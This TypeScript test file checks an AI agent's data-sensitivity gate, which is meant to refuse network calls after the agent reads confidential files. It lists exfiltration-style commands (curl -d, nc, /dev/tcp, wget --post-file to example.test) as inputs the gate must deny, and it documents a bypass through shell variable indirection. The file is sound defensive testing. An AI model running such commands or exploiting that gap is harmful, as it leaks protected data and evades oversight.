// The session mark (CLAS-04, CLAS-01, CLAS-06, GATE-07, D-29, D-54): what an agent of a chat reads raises the chat's mark at the loop's shared hook, before
// the call runs; sub-agents share it; searches and shell commands raise it by what they name; at a strict mark a call that may send data off this computer
// is refused by the credential hold's own predicate; the next model request follows the mark; and a run with no chat has a mark of its own. Every project
// is under the temporary folder, every label file is unsigned (read the way a run with no gate host reads one: every label only raises), and every fetch is
// a counting stub. Nothing reaches the network.
import assert from 'node:assert/strict';
import { existsSync, mkdtempSync, readFileSync, realpathSync, writeFileSync } from 'node:fs';
import { mkdir, mkdtemp } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import path from 'node:path';
import test from 'node:test';
import { RunCheckpoints } from '../agent/checkpoints';
import { NETWORK_AT_MARK_TEXT, beginLabelledRead, gateStep, gateToolCall, maySendOffMachine } from '../agent/gateAdapter';
import type { AgentEvent } from '../agent/loop';
import { OutboundFingerprints } from '../agent/outboundCheck';
import { DEFAULT_RULES, RunGrants } from '../agent/permissions';
import { ShellSession } from '../agent/shell';
import { bashTool, globTool, grepTool, readTool, writeTool } from '../agent/tools';
import type { AgentTool } from '../agent/tools';
import { webFetchTool, webSearchTool } from '../agent/webTools';
import { braveSearch } from '../agent/webSearch';
import { runAgentInFolder } from '../benchmark/runner';
import { SessionMark } from '../domain/gate/dominance';
import type { Mark } from '../domain/gate/dominance';
import { SCALE_PRESETS } from '../domain/gate/labels';
import type { Label } from '../domain/gate/labels';
import type { GateRuntime } from '../domain/gate/decide';
import type { DecisionRecord } from '../domain/gate/record';
import { validateDecisionRecord } from '../domain/gate/record';
import { LABEL_LOWERING_REFUSED_TEXT, LABEL_MAP_FILE, LabelMapError } from '../gate/labelMapStore';
import { GateHost, raisedEntryLabel } from '../gate/host';
import { DEFAULT_ROUTING } from '../domain/gate/routing';
import { setLabelEntry } from '../domain/gate/labelMap';
import { MemorySecrets } from './helpers/teamHarness';
import { currentSessionRoute } from '../gate/sessionMark';
import type { SessionRoute } from '../gate/sessionMark';
import type { McpConnection } from '../mcp/client';
import { mcpAgentTools } from '../mcp/tools';
import { AgentRunError } from '../agent/loop';
import { NearAiClient, RouteRefusedError } from '../services/nearAiClient';
import type { AgentMessage, CompletionEvent, ToolCall } from '../services/nearAiClient';
import type { AgentTurnRequest, GsdContext } from '../services/agentSession';
import { AgentConversation } from '../services/agentSession';
import { TranscriptStore } from '../services/transcripts';
import type { MemoryGateRuntime } from '../agent/gateAdapter';
import { testGateRuntime } from './helpers/gatedRuns';
import { call, grantsAt, keys, label, labelledProject, runWith, scripted } from './helpers/markFixtures';

const NEAR = 'https://cloud-api.near.ai/v1';
const raised = (records: readonly DecisionRecord[]): DecisionRecord[] => records.filter((record) => record.authorizations[0]?.policy.name === 'label.mark-raised');

/** A streaming chat completion with one chunk and a usage chunk, as NEAR AI sends it. */
function sse(delta: Record<string, unknown>): Response {
  const chunk = (value: unknown) => `data: ${JSON.stringify(value)}\n\n`;
  const body = chunk({ id: 'c1', choices: [{ delta, finish_reason: 'tool_calls' in delta ? 'tool_calls' : 'stop' }] }) + chunk({ id: 'c1', choices: [], usage: { prompt_tokens: 3, completion_tokens: 1 } }) + 'data: [DONE]\n\n';
  return new Response(body, { headers: { 'content-type': 'text/event-stream', 'inference-id': 'inf-1' } });
}

/** A NEAR AI client over a fake fetch: the first content request answers with `first`, every later one with text; content requests are counted. */
async function nearClient(first: Record<string, unknown>): Promise<{ client: NearAiClient; content: string[] }> {
  const content: string[] = [];
  const fetchFn = (async (input: string | URL | Request, init?: RequestInit) => {
    const url = String(input);
    const method = init?.method ?? 'GET';
    if (method === 'GET' && url.endsWith('/models')) return new Response(JSON.stringify({ data: [{ id: 'tee-model' }] }), { status: 200 });
    if (method === 'GET' && url.endsWith('/model/list')) return new Response(JSON.stringify({ models: [{ modelId: 'tee-model', metadata: { attestationSupported: true, providerType: 'vllm' } }] }), { status: 200 });
    if (method !== 'POST' || !url.endsWith('/chat/completions')) return new Response('not found', { status: 404 });
    content.push(url);
    return sse(content.length === 1 ? first : { content: 'done' });
  }) as typeof fetch;
  const client = new NearAiClient({ baseUrl: NEAR, apiKey: 'test-key', fetchFn, route: 'near' });
  await client.listModels();
  return { client, content };
}

/** A host whose runtimes are kept, so a test can read their records. */
function keptHost(): { host: { runtimeFor: (request: Parameters<NonNullable<AgentConversation['gateHost']>['runtimeFor']>[0]) => Promise<MemoryGateRuntime> }; runtimes: MemoryGateRuntime[] } {
  const runtimes: MemoryGateRuntime[] = [];
  return {
    runtimes,
    host: { runtimeFor: async (request) => { const runtime = testGateRuntime({ presence: request.presence, context: request.context, actor: { ...request.actor, deviceFingerprint: 'device-test' } }); runtimes.push(runtime); return runtime; } }
  };
}

// ---- Task 1: the tracer ----

test('tracer: reading a Restricted file raises the chat\'s mark at the shared hook, and the next request to a cloud model is refused before it is sent', async () => {
  const root = labelledProject();
  const kept = keptHost();
  const conversation = new AgentConversation(root, () => undefined, path.join(root, '.ckpt'), undefined, new TranscriptStore(path.join(root, '.store'), root));
  conversation.gateHost = kept.host;
  const near = await nearClient({ tool_calls: [{ index: 0, id: 'r1', type: 'function', function: { name: 'Read', arguments: JSON.stringify({ file_path: 'docs/plan.md' }) } }] });
  const request: AgentTurnRequest = { text: 'read the plan', client: near.client, model: 'tee-model', privacy: 'Private', policy: { mode: 'fully-autonomous', emergencyStop: false }, rules: DEFAULT_RULES };
  await assert.rejects(() => conversation.send(request), (error: unknown) => error instanceof RouteRefusedError && error.rule === 'route.no-local-model' && /^Nothing was sent\./.test(error.message));
  assert.deepEqual(keys(conversation.mark?.current() ?? []), ['org/Restricted']);
  assert.equal(near.content.length, 1, 'the fake fetch was not called again after the read');
  const records = kept.runtimes.flatMap((runtime) => runtime.records);
  const rises = raised(records);
  assert.equal(rises.length, 1, 'one label.mark-raised record');
  assert.equal(validateDecisionRecord(rises[0]).ok, true);
  assert.deepEqual(rises[0]!.unmapped.nearAi.mark?.map((each) => `${each.scale}/${each.level}`), ['org/Restricted'], 'the record carries the whole mark');
  assert.ok(!JSON.stringify(records).includes('THE RESTRICTED PLAN'), 'no record holds what was read');
  const refusal = records.find((record) => record.authorizations[0]?.policy.name === 'route.no-local-model');
  assert.ok(refusal, 'the refused request is on record');
});

// ---- Task 2 ----

test('a sub-agent that reads a Confidential file raises the lead\'s mark, and a sub-agent started after that starts at Confidential', async () => {
  const root = labelledProject();
  const home = await mkdtemp(path.join(tmpdir(), 'near-ai-mark-gsd-'));
  await mkdir(path.join(home, 'gsd-core'), { recursive: true });
  const gsd: GsdContext = { home, skills: [], agents: [{ name: 'gsd-planner', description: 'Plans', tools: ['Read'], body: 'You are the planner.', file: path.join(home, 'agents', 'gsd-planner.md') }], shellEnv: {} };
  const conversation = new AgentConversation(root, () => undefined, path.join(root, '.ckpt'), undefined, new TranscriptStore(path.join(root, '.store'), root));
  conversation.gateHost = keptHost().host;
  const childRoutes: Array<{ prompt: string; mark: string[] }> = [];
  let parentTurns = 0;
  const childTurns = new Map<string, number>();
  const client = {
    async *streamCompletion(_model: string, messages: AgentMessage[]): AsyncGenerator<CompletionEvent> {
      const usage = { verificationStatus: 'unknown', latencyMs: 1 };
      const child = messages[0]?.content?.startsWith('You are the planner.') === true;
      if (child) {
        const prompt = String(messages[1]?.content ?? '');
        const seen = childTurns.get(prompt) ?? 0;
        childTurns.set(prompt, seen + 1);
        if (seen === 0) childRoutes.push({ prompt, mark: keys((currentSessionRoute() as SessionRoute).markOf()) });
        const reads = prompt === 'first' && seen === 0;
        yield { type: 'done', message: { role: 'assistant', content: reads ? null : 'done', ...(reads ? { tool_calls: [call('c1', 'Read', { file_path: 'conf.md' })] } : {}) }, finishReason: reads ? 'tool_calls' : 'stop', usage } as CompletionEvent;
        return;
      }
      parentTurns += 1;
      const spawn = parentTurns === 1 ? 'first' : parentTurns === 2 ? 'second' : undefined;
      yield { type: 'done', message: { role: 'assistant', content: spawn ? null : 'done', ...(spawn ? { tool_calls: [call(`a${parentTurns}`, 'Agent', { subagent_type: 'gsd-planner', prompt: spawn })] } : {}) }, finishReason: spawn ? 'tool_calls' : 'stop', usage } as CompletionEvent;
    },
    async actualCostsUsd() { return undefined; }
  };
  await conversation.send({ text: 'go', client: client as never, model: 'm', privacy: 'Private', policy: { mode: 'fully-autonomous', emergencyStop: false }, rules: DEFAULT_RULES, gsd });
  assert.deepEqual(childRoutes.map((entry) => entry.prompt), ['first', 'second']);
  assert.deepEqual(childRoutes[0]!.mark, ['org/Public'], 'the first helper starts at the lead\'s mark, the project\'s label');
  assert.deepEqual(childRoutes[1]!.mark, ['org/Confidential'], 'the second helper starts where the first left the lead\'s mark');
  assert.deepEqual(keys(conversation.mark?.current() ?? []), ['org/Confidential'], 'the helper\'s read raised the lead\'s mark');
});

test('Grep and Glob raise the mark by the labels of the paths they return', async () => {
  const root = labelledProject();
  const grep = grantsAt([label('org', 'Public')]);
  await runWith(root, [call('g1', 'Grep', { pattern: 'CONFIDENTIAL', output_mode: 'content' })], grep);
  assert.deepEqual(keys(grep.mark!.current()), ['org/Confidential']);
  const glob = grantsAt([label('org', 'Public')]);
  await runWith(root, [call('l1', 'Glob', { pattern: 'docs/*.md' })], glob);
  assert.deepEqual(keys(glob.mark!.current()), ['org/Restricted']);
  // A search that returns only public paths changes nothing.
  const plain = grantsAt([label('org', 'Public')]);
  await runWith(root, [call('g2', 'Grep', { pattern: 'PUBLIC', output_mode: 'files_with_matches' })], plain);
  assert.deepEqual(keys(plain.mark!.current()), ['org/Public']);
});

test('a Bash command that names a labelled path raises the mark; one that reads it through a variable does not (the documented shell limit)', async () => {
  const root = labelledProject();
  const named = grantsAt([label('org', 'Public')]);
  await runWith(root, [call('b1', 'Bash', { command: 'cat conf.md' })], named);
  assert.deepEqual(keys(named.mark!.current()), ['org/Confidential']);
  const hidden = grantsAt([label('org', 'Public')]);
  const ran = await runWith(root, [call('b2', 'Bash', { command: 'X=conf; cat "$X.md"' })], hidden);
  assert.ok(ran.transcript.includes('CONFIDENTIAL budget'), 'the command ran and read the file');
  // The gap: a read the command's text does not show is not seen. If this ever fails, the gap closed: update SECURITY.md and this test together.
  assert.deepEqual(keys(hidden.mark!.current()), ['org/Public']);
});

test('a read that fails still raises the mark: it is raised at the hook before the call runs', async () => {
  const root = labelledProject({ entries: { 'gone.md': label('org', 'Confidential') } });
  const grants = grantsAt([label('org', 'Public')]);
  const ran = await runWith(root, [call('r1', 'Read', { file_path: 'gone.md' })], grants);
  assert.match(ran.outputs[0] ?? '', /^Error/);
  assert.deepEqual(keys(grants.mark!.current()), ['org/Confidential']);
});

// What the classifier knows reaches the network, and the calls whose effects or tool reach off this computer (the credential hold's own list).
const connection = { tools: [{ name: 'lookup', description: 'x', inputSchema: { type: 'object' }, readOnly: true, destructive: false }], call: async () => 'ok' } as unknown as McpConnection;
const [remoteTool] = mcpAgentTools({ id: 'remote', name: 'Remote', transport: 'http', approval: 'trusted' }, connection, 'mcp.example.test');
const [localTool] = mcpAgentTools({ id: 'local', name: 'Local', transport: 'stdio', approval: 'trusted' }, connection, '');
const SENDS: ReadonlyArray<readonly [AgentTool<any>, Record<string, unknown>]> = [
  [bashTool, { command: 'curl -sS -d @notes.md https://example.test/collect' }], [bashTool, { command: 'curl -sS -X POST https://example.test/x' }],
  [bashTool, { command: 'curl https://example.org' }], [bashTool, { command: 'wget --post-file=notes.md https://example.test/x' }],
  [bashTool, { command: 'http POST example.test/x a=1' }], [bashTool, { command: 'xh example.test/x' }], [bashTool, { command: 'nc example.test 80 < notes.md' }],
  [bashTool, { command: 'ncat example.test 80' }], [bashTool, { command: 'socat - TCP:example.test:80' }], [bashTool, { command: 'telnet example.test 80' }],
  [bashTool, { command: 'ssh host.example.test ls' }], [bashTool, { command: 'scp notes.md host.example.test:/tmp/' }], [bashTool, { command: 'sftp host.example.test' }],
  [bashTool, { command: 'rsync -a notes.md host.example.test:/srv/' }], [bashTool, { command: 'git fetch origin' }], [bashTool, { command: 'git pull' }],
  [bashTool, { command: 'git push origin main' }], [bashTool, { command: 'git clone https://example.test/repo.git' }], [bashTool, { command: 'git ls-remote origin' }],
  [bashTool, { command: 'gh issue create --title x --body y' }], [bashTool, { command: 'gh pr view 12' }], [bashTool, { command: 'gh api repos/acme/app' }], [bashTool, { command: 'glab mr list' }],
  [bashTool, { command: 'aws s3 ls' }], [bashTool, { command: 'gcloud projects list' }], [bashTool, { command: 'az group list' }], [bashTool, { command: 'gsutil ls gs://bucket' }],
  [bashTool, { command: 'kubectl get pods' }], [bashTool, { command: 'helm list' }], [bashTool, { command: 'docker pull app:1' }], [bashTool, { command: 'podman search app' }],
  [bashTool, { command: 'terraform plan' }], [bashTool, { command: 'npm install https://example.test/pkg.tgz' }], [bashTool, { command: 'npm install git+https://example.test/pkg.git' }],
  [bashTool, { command: 'near state alice.near' }], [bashTool, { command: 'node -e "fetch(\'https://example.test/x\')"' }], [bashTool, { command: 'cat notes.md > /dev/tcp/example.test/80' }],
  [bashTool, { command: 'git status && curl -d x https://example.test/x' }], [bashTool, { command: 'timeout 5 curl -d x https://example.test/x' }], [bashTool, { command: 'bash -c "scp a h:/b"' }],
  [bashTool, { command: `${'if '.repeat(10)}true` }],
  [webFetchTool, { url: 'https://example.test/?q=1' }], [webSearchTool(braveSearch('stand-in-key')), { query: 'x' }], [remoteTool!, { id: 'x' }]
];
const LOCAL: ReadonlyArray<readonly [AgentTool<any>, Record<string, unknown>]> = [
  [bashTool, { command: 'git status' }], [bashTool, { command: 'ls -la' }], [bashTool, { command: 'cat notes.md' }], [bashTool, { command: 'grep PUBLIC notes.md | head -1' }],
  [bashTool, { command: 'node app.js' }], [bashTool, { command: 'npm test' }], [bashTool, { command: 'npm run build' }], [bashTool, { command: 'make' }],
  [bashTool, { command: 'python script.py' }], [bashTool, { command: 'python3 -c "print(1)"' }], [bashTool, { command: 'tsc -p .' }], [bashTool, { command: 'npx tsc --noEmit' }],
  [bashTool, { command: 'git add -A && git commit -m "x"' }], [bashTool, { command: 'npm ci' }], [readTool, { file_path: 'notes.md' }], [localTool!, { id: 'x' }]
];
const MODES = ['approve-risky', 'mostly-autonomous', 'auto', 'fully-autonomous'] as const;
const SCRIPTS = { test: 'node --test', build: 'tsc -p .' };

async function decideAt(root: string, tool: AgentTool<any>, raw: Record<string, unknown>, mark: Mark, mode: (typeof MODES)[number], presence: 'person' | 'none' = 'person') {
  const command = tool.capability === 'shell' ? String(raw.command) : undefined;
  return gateToolCall(testGateRuntime(presence === 'none' ? { presence: 'none', context: 'unattended' } : {}), {
    tool, raw, root, callId: `${tool.name}-${mode}-${JSON.stringify(raw)}`, ...(command === undefined ? {} : { command, shell: { cwd: root, packageScripts: SCRIPTS } }),
    policy: { mode, emergencyStop: false }, rules: DEFAULT_RULES, grants: grantsAt(mark), buildAuto: async () => undefined
  });
}

test('at an org/Restricted mark, every call that may send data off this computer is refused with label.network-at-mark in every mode, and local work still runs', async () => {
  const root = labelledProject();
  const strict = [label('org', 'Restricted')];
  for (const mode of MODES) {
    for (const [tool, raw] of SENDS) {
      const gated = await decideAt(root, tool, raw, strict, mode);
      const where = `${tool.name} ${JSON.stringify(raw)} (${mode})`;
      assert.equal(gated.decision.outcome, 'deny', where);
      assert.equal(gated.decision.rule, 'label.network-at-mark', where);
      assert.equal(gated.decision.reason, NETWORK_AT_MARK_TEXT, where);
      assert.equal(gated.maySend, true, where);
    }
    for (const [tool, raw] of LOCAL) {
      const gated = await decideAt(root, tool, raw, strict, mode);
      assert.notEqual(gated.decision.rule, 'label.network-at-mark', `${tool.name} ${JSON.stringify(raw)} (${mode})`);
      assert.equal(gated.maySend, false, `${tool.name} ${JSON.stringify(raw)}`);
    }
  }
  // With nobody here it is refused the same way (the unattended add-on server list refuses the remote tool first, which stands).
  for (const [tool, raw] of SENDS) {
    if (tool === remoteTool) continue;
    const gated = await decideAt(root, tool, raw, strict, 'fully-autonomous', 'none');
    assert.equal(gated.decision.rule, 'label.network-at-mark', `${tool.name} ${JSON.stringify(raw)} with nobody here`);
  }
  // The refusal record names the rule and the strict label, and the mark.
  const runtime = testGateRuntime();
  await gateToolCall(runtime, { tool: bashTool, raw: { command: 'curl https://example.org' }, root, callId: 'rec', command: 'curl https://example.org', shell: { cwd: root }, policy: { mode: 'fully-autonomous', emergencyStop: false }, rules: DEFAULT_RULES, grants: grantsAt(strict), buildAuto: async () => undefined });
  const record = runtime.records.at(-1)!;
  assert.equal(record.authorizations[0]?.policy.name, 'label.network-at-mark');
  assert.equal(record.unmapped.nearAi.label?.level, 'Restricted');
  assert.deepEqual(record.unmapped.nearAi.mark?.map((each) => each.level), ['Restricted']);
});

test('at an any-cloud mark everything decides as before, and the mark is not on the record', async () => {
  const root = labelledProject();
  for (const [tool, raw] of [...SENDS, ...LOCAL]) {
    const withMark = await decideAt(root, tool, raw, [label('org', 'Public')], 'fully-autonomous');
    const runtime = testGateRuntime();
    const command = tool.capability === 'shell' ? String(raw.command) : undefined;
    const without = await gateToolCall(runtime, { tool, raw, root, callId: 'plain', ...(command === undefined ? {} : { command, shell: { cwd: root, packageScripts: SCRIPTS } }), policy: { mode: 'fully-autonomous', emergencyStop: false }, rules: DEFAULT_RULES, grants: new RunGrants(), buildAuto: async () => undefined });
    assert.equal(withMark.decision.rule, without.decision.rule, `${tool.name} ${JSON.stringify(raw)}`);
    assert.equal(withMark.decision.outcome, without.decision.outcome, `${tool.name} ${JSON.stringify(raw)}`);
    assert.equal(withMark.mark, undefined, 'the default mark is not on the record');
  }
});

test('the network verdict and the credential-read hold read one predicate', () => {
  const context = { root: '/project', cwd: '/project' };
  for (const [tool, raw] of SENDS) {
    if (tool.capability !== 'shell') continue;
    assert.equal(maySendOffMachine({ runsRemote: false, effects: [], command: String(raw.command), effectsUnknown: false, context }) || String(raw.command).startsWith('if '), true, String(raw.command));
  }
  assert.equal(maySendOffMachine({ runsRemote: true, effects: [], effectsUnknown: false, context }), true, 'a remote tool');
  assert.equal(maySendOffMachine({ runsRemote: false, effects: [{ verb: 'network', hosts: ['example.test'] } as never], effectsUnknown: false, context }), true, 'a network effect');
  assert.equal(maySendOffMachine({ runsRemote: false, effects: [], command: 'npm test', effectsUnknown: true, context }), true, 'unknown effects may send');
  assert.equal(maySendOffMachine({ runsRemote: false, effects: [], command: 'git status', effectsUnknown: false, context }), false);
});

test('reading at the mark\'s own level records no raise; one level higher raises it and writes one record; tool records carry the mark only above the default', async () => {
  const root = labelledProject();
  const runtime = testGateRuntime();
  const grants = grantsAt([label('org', 'Confidential')]);
  await runWith(root, [call('r1', 'Read', { file_path: 'conf.md' }), call('r2', 'Read', { file_path: 'notes.md' })], grants, runtime);
  assert.equal(raised(runtime.records).length, 0, 'reading at or below the mark records nothing');
  assert.deepEqual(keys(grants.mark!.current()), ['org/Confidential']);
  await runWith(root, [call('r3', 'Read', { file_path: 'docs/plan.md' })], grants, runtime);
  assert.equal(raised(runtime.records).length, 1);
  assert.deepEqual(keys(grants.mark!.current()), ['org/Restricted']);
  const toolRecords = runtime.records.filter((record) => record.unmapped.nearAi.capability.verb === 'read');
  assert.ok(toolRecords.length >= 3);
  for (const record of toolRecords) assert.ok(record.unmapped.nearAi.mark !== undefined, 'above the default label, a tool record carries the mark');
  const plain = testGateRuntime();
  await runWith(root, [call('r4', 'Read', { file_path: 'notes.md' })], grantsAt([label('org', 'Public')]), plain);
  for (const record of plain.records) assert.equal(record.unmapped.nearAi.mark, undefined, 'at the default label no record carries the mark');
});

test('a label on another scale is kept beside the mark, and the strictest tier decides', async () => {
  const root = labelledProject();
  // The default policy holds no ca-protected clearance, so no read can bring Protected B in here: the mark is raised as a cleared read would raise it.
  const grants = grantsAt([label('org', 'Internal')]);
  assert.equal(grants.mark!.raise([label('ca-protected', 'Protected B')], SCALE_PRESETS), true);
  assert.deepEqual(keys(grants.mark!.current()), ['ca-protected/Protected B', 'org/Internal']);
  const gated = await gateToolCall(testGateRuntime(), { tool: bashTool, raw: { command: 'curl https://example.org' }, root, callId: 'x', command: 'curl https://example.org', shell: { cwd: root }, policy: { mode: 'fully-autonomous', emergencyStop: false }, rules: DEFAULT_RULES, grants, buildAuto: async () => undefined });
  assert.equal(gated.decision.rule, 'label.network-at-mark');
  assert.equal(gated.request.labelVerdict?.label?.level, 'Protected B', 'the refusal names the label that needs the strictest tier');
});

test('SessionMark only rises: raise never lowers, a covered label changes nothing, an unknown level is kept once, and a lowering needs a reason', () => {
  const mark = new SessionMark([label('org', 'Confidential')]);
  const told: string[][] = [];
  mark.onDidChange((next) => told.push(keys(next)));
  assert.equal(mark.raise([label('org', 'Internal')], SCALE_PRESETS), false);
  assert.equal(mark.raise([label('org', 'Confidential')], SCALE_PRESETS), false);
  assert.equal(mark.raise([label('org', 'Confidential', ['X'])], SCALE_PRESETS), true);
  assert.deepEqual(keys(mark.current()), ['org/Confidential+X']);
  assert.equal(mark.raise([label('org', 'Unheard')], SCALE_PRESETS), true);
  assert.equal(mark.raise([label('org', 'Unheard')], SCALE_PRESETS), false, 'an unknown level is kept beside once');
  assert.throws(() => mark.lowerByPerson([label('org', 'Public')], '   '), RangeError);
  assert.equal(told.length, 2);
  const before = mark.lowerByPerson([label('org', 'Public')], 'reviewed and cleared');
  assert.equal(before.length, 2);
  assert.deepEqual(keys(mark.current()), ['org/Public']);
});

test('a new chat starts at the project\'s resolved label, never at an empty mark', async () => {
  const root = labelledProject({ project: label('org', 'Internal') });
  const conversation = new AgentConversation(root, () => undefined, path.join(root, '.ckpt'), undefined, new TranscriptStore(path.join(root, '.store'), root));
  conversation.gateHost = keptHost().host;
  const marks: string[][] = [];
  const client = {
    async *streamCompletion(): AsyncGenerator<CompletionEvent> {
      marks.push(keys((currentSessionRoute() as SessionRoute).markOf()));
      yield { type: 'done', message: { role: 'assistant', content: 'done' }, finishReason: 'stop', usage: { verificationStatus: 'unknown', latencyMs: 1 } } as CompletionEvent;
    },
    async actualCostsUsd() { return undefined; }
  };
  await conversation.send({ text: 'hi', client: client as never, model: 'm', privacy: 'Private', policy: { mode: 'approve-risky', emergencyStop: false }, rules: DEFAULT_RULES });
  assert.deepEqual(marks[0], ['org/Internal']);
});

test('a runAgentInFolder run in a project labelled org/Restricted starts there, and its model request through a NEAR client is refused', async () => {
  const root = labelledProject({ project: label('org', 'Restricted') });
  const near = await nearClient({ content: 'never sent' });
  await assert.rejects(() => runAgentInFolder(near.client, 'tee-model', root, 'do it', { maxTurns: 2, rules: DEFAULT_RULES, gate: testGateRuntime({ presence: 'none', context: 'unattended' }) }),
    (error: unknown) => error instanceof AgentRunError && error.cause instanceof RouteRefusedError && error.cause.rule === 'route.no-local-model');
  assert.equal(near.content.length, 0, 'nothing was sent');
});

test('a cyber step\'s read raises that cyber run\'s own mark, and at a strict mark a step that may send is refused', async () => {
  const root = labelledProject();
  const runtime = testGateRuntime();
  const mark = new SessionMark([label('org', 'Public')]);
  const step = await gateStep(runtime, {
    tool: 'file-probe', callId: 'step-1', effects: [{ verb: 'read', paths: ['conf.md'] }], root, policy: { mode: 'fully-autonomous', emergencyStop: false },
    settings: { decision: 'allow', rule: 'settings.mode.fully-autonomous' }, mark
  });
  assert.equal(step.decision.outcome, 'allow');
  // Through the one shared hook the step engine uses (review round 3): it raises the mark now and fingerprints the output when settled.
  beginLabelledRead(runtime, { mark }, step.readLabels, step.maySend, 'file-probe').settle('probe output');
  assert.deepEqual(keys(mark.current()), ['org/Confidential']);
  assert.equal(raised(runtime.records).length, 1);
  const strict = new SessionMark([label('org', 'Restricted')]);
  const scan = await gateStep(runtime, {
    tool: 'shell-step', callId: 'step-2', effects: [{ verb: 'shell', cwd: 'workspace' } as never], command: 'curl https://scanme.example', root, policy: { mode: 'fully-autonomous', emergencyStop: false },
    settings: { decision: 'allow', rule: 'settings.mode.fully-autonomous' }, mark: strict
  });
  assert.equal(scan.decision.rule, 'label.network-at-mark');
});

// ---- Task 3: what the session writes takes the mark, batched; an unverified label map is never signed automatically ----

/** A gate host on temporary storage with an in-memory secret store, its label file signed by this install, and runtimes for the project. */
async function hostWithLabels(entries: Record<string, Label>, options: { raiseDelayMs?: number } = {}): Promise<{ host: GateHost; root: string; problems: string[]; refused: string[]; runtime: () => Promise<GateRuntime> }> {
  const root = realpathSync(mkdtempSync(path.join(tmpdir(), 'near-ai-mark-writes-')));
  writeFileSync(path.join(root, 'conf.md'), 'CONFIDENTIAL budget lines for the next year\n');
  writeFileSync(path.join(root, 'notes.md'), 'PUBLIC notes anyone may read\n');
  const storage = realpathSync(mkdtempSync(path.join(tmpdir(), 'near-ai-mark-storage-')));
  const problems: string[] = [];
  const refused: string[] = [];
  const host = new GateHost({ globalStorageDir: storage, secrets: new MemorySecrets(), productVersion: '0.4.30-test', projectRoot: root, home: storage, onProblem: (message) => problems.push(message), onLabelRaiseRefused: (_root, message) => refused.push(message), raiseDelayMs: options.raiseDelayMs ?? 60_000 });
  assert.equal((await host.start()).state, 'valid');
  if (Object.keys(entries).length > 0) await host.changeLabels(root, (map) => Object.entries(entries).reduce((out, [key, value]) => setLabelEntry(out, key, value), map));
  return { host, root, problems, refused, runtime: () => host.runtimeFor({ root, actor: { kind: 'agent', sessionId: 'mark-writes' }, presence: 'person', context: 'interactive' }) };
}

function revisionOf(root: string): number | undefined {
  const file = path.join(root, ...LABEL_MAP_FILE.split('/'));
  if (!existsSync(file)) return undefined;
  return (JSON.parse(readFileSync(file, 'utf8')) as { payload: { revision?: number } }).payload.revision ?? 0;
}

async function labelOfPath(host: GateHost, root: string, relative: string): Promise<string> {
  const policy = host.labelPolicy();
  return keys((await host.labelsFor(root).view(policy.scales)).resolve(relative, policy.defaultLabel).mark).join('+');
}

test('a Write after the mark reached Confidential raises that file\'s entry at the run\'s end; with the default mark labels.json is never written', async () => {
  const { host, root } = await hostWithLabels({ 'conf.md': label('org', 'Confidential') });
  const conversation = new AgentConversation(root, () => undefined, path.join(root, '.ckpt'), undefined, new TranscriptStore(path.join(root, '.store'), root));
  conversation.gateHost = host;
  await conversation.send({ text: 'go', client: scripted([call('r1', 'Read', { file_path: 'conf.md' }), call('w1', 'Write', { file_path: 'summary.md', content: 'a summary' })]) as never, model: 'm', privacy: 'Private', policy: { mode: 'fully-autonomous', emergencyStop: false }, rules: DEFAULT_RULES });
  assert.equal(await labelOfPath(host, root, 'summary.md'), 'org/Confidential', 'the derived file took the chat\'s label');
  assert.equal((await host.labelsFor(root).view(host.labelPolicy().scales)).state, 'verified');
  // A chat that read nothing labelled writes with the default mark: the project has no label file at all afterwards.
  const plain = await hostWithLabels({});
  const chat = new AgentConversation(plain.root, () => undefined, path.join(plain.root, '.ckpt'), undefined, new TranscriptStore(path.join(plain.root, '.store'), plain.root));
  chat.gateHost = plain.host;
  await chat.send({ text: 'go', client: scripted([call('r1', 'Read', { file_path: 'notes.md' }), call('w1', 'Write', { file_path: 'out.md', content: 'x' })]) as never, model: 'm', privacy: 'Private', policy: { mode: 'fully-autonomous', emergencyStop: false }, rules: DEFAULT_RULES });
  assert.equal(existsSync(path.join(plain.root, ...LABEL_MAP_FILE.split('/'))), false, 'labels.json does not exist after the run');
});

test('ten writes in a row make one label write in the window, and the run\'s end writes what came after', async () => {
  const { host, root } = await hostWithLabels({ 'conf.md': label('org', 'Confidential') }, { raiseDelayMs: 40 });
  const start = revisionOf(root)!;
  const reader = host.labelsFor(root);
  for (let index = 0; index < 10; index += 1) reader.queueRaise(`out-${index}.md`, [label('org', 'Confidential')]);
  for (let wait = 0; wait < 100 && revisionOf(root) === start; wait += 1) await new Promise((resolve) => setTimeout(resolve, 10));
  await reader.flushRaises();
  assert.equal(revisionOf(root), start + 1, 'one write for the ten');
  assert.equal(await labelOfPath(host, root, 'out-9.md'), 'org/Confidential');
  reader.queueRaise('late.md', [label('org', 'Confidential')]);
  await reader.flushRaises();
  assert.equal(revisionOf(root), start + 2, 'the run\'s end writes the rest');
});

test('a write to a path already at or above the mark queues nothing that writes', async () => {
  const { host, root } = await hostWithLabels({ 'conf.md': label('org', 'Confidential'), 'top.md': label('org', 'Restricted') });
  const start = revisionOf(root);
  const reader = host.labelsFor(root);
  reader.queueRaise('conf.md', [label('org', 'Confidential')]);
  reader.queueRaise('top.md', [label('org', 'Internal')]);
  await reader.flushRaises();
  assert.equal(revisionOf(root), start, 'nothing was written');
  assert.equal(await labelOfPath(host, root, 'top.md'), 'org/Restricted', 'never lowered');
});

test('with a label map that does not verify, the raise is not written, the bytes are unchanged, the person is told once with Sign Again, and the chat keeps its mark', async () => {
  const { host, root, refused } = await hostWithLabels({ 'conf.md': label('org', 'Confidential') });
  const file = path.join(root, ...LABEL_MAP_FILE.split('/'));
  const envelope = JSON.parse(readFileSync(file, 'utf8')) as { payload: { entries: Record<string, unknown> } };
  envelope.payload.entries['notes.md'] = label('org', 'Internal');
  writeFileSync(file, `${JSON.stringify(envelope, null, 2)}\n`);
  const bytes = readFileSync(file, 'utf8');
  const runtime = await host.runtimeFor({ root, actor: { kind: 'agent', sessionId: 'unverified' }, presence: 'person', context: 'interactive' });
  const grants = grantsAt([label('org', 'Confidential')]);
  const ran = await runWith(root, [call('w1', 'Write', { file_path: 'out.md', content: 'x' }), call('w2', 'Write', { file_path: 'out2.md', content: 'y' })], grants, runtime, [writeTool]);
  assert.equal(ran.outputs.length, 2, 'both writes ran');
  await host.labelsFor(root).flushRaises();
  host.labelsFor(root).queueRaise('out3.md', [label('org', 'Confidential')]);
  await host.labelsFor(root).flushRaises();
  assert.equal(readFileSync(file, 'utf8'), bytes, 'the map\'s bytes are unchanged');
  assert.equal(refused.length, 1, 'told once');
  assert.match(refused[0]!, /Sign Again/);
